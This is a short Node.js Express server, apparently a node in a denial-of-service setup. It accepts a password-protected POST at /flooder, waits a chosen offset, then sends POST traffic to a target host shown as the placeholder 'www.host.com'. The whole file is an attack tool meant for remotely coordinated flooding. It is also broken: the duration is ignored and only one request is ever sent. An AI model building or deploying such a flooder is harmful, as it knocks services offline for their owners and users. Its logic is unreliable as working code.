const express = require("express")
const bodyParser = require("body-parser")
const app = express();
const http = require("http")

//Here we are configuring express to use body-parser as middle-ware.
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

//React on a GET request, just sending some string
app.get("/", function(req,res) {
    res.send("This is the flooder")
})

//React on the post request of the client at /flooder, only if key is a specific string
//runs the flood function
app.post('/flooder',function(req,res) {
    console.log("Got a post")
    if (req.body.key == 'ditiseensoortwachtwoord') {
        flood(req.body.offset,req.body.duration)
        res.writeHead(200, {'Content-Type': 'text/html'})
        res.end('Now flooding after ' + req.body.offset + ' for ' + req.body.duration + ' seconds')
    } else {
        console.log("Nevermind")
        res.writeHead(400, {'Content-Type': 'text/html'})
        res.end()
    }
})

//Options for the sending of POST flood data
const options = {
    host: 'www.host.com', //whereto?
    path: '/',
    port: '80',
    method: 'POST'
}

//Waits <offset> seconds before flooding a host in the options constant
const flood = async function(offset,duration) {
    //Waiting
    console.log("now waiting for " + offset + " seconds")
    await new Promise(resolve => setTimeout(resolve, offset * 1000));
    console.log("Now Flodding for " + duration + " seconds")
    
    //Sending POST request
    const req = http.request(options, res => {
        console.log(`statusCode: ${res.statusCode}`)
      
        res.on('data', d => {
          process.stdout.write(d)
        })
      })
      
      req.on('error', error => {
        console.error(error)
      })
    req.write("data")
    req.end()
}


//Listen on port 3000 for incoming requests
app.listen(3000,function() {
    console.log("listening on 3000")
})